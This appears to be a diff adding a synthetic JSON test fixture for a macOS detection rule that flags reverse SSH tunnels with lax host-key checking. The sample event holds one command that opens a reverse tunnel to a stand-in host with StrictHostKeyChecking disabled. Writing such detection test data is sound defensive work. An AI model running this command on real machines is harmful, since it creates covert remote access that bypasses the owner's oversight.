@@ -1,0 +1,21 @@
+{
+  "_larc": {
+    "classification": "synthetic-benign",
+    "schema": "ecs",
+    "rule": "SERAPH_MacOS_SSH_Reverse_Lax_HostKey",
+    "expected": "match",
+    "source_fixture": "tests/fixtures/sigma/SERAPH_MacOS_SSH_Reverse_Lax_HostKey/positive/equals_no.json"
+  },
+  "record": {
+    "process": {
+      "executable": "/usr/bin/ssh",
+      "command_line": "ssh -N -R 127.0.0.1:2222:127.0.0.1:22 -o StrictHostKeyChecking=no tunnel@example.invalid",
+      "parent": {
+        "executable": "/sbin/launchd"
+      }
+    },
+    "user": {
+      "name": "dev"
+    }
+  }
+}
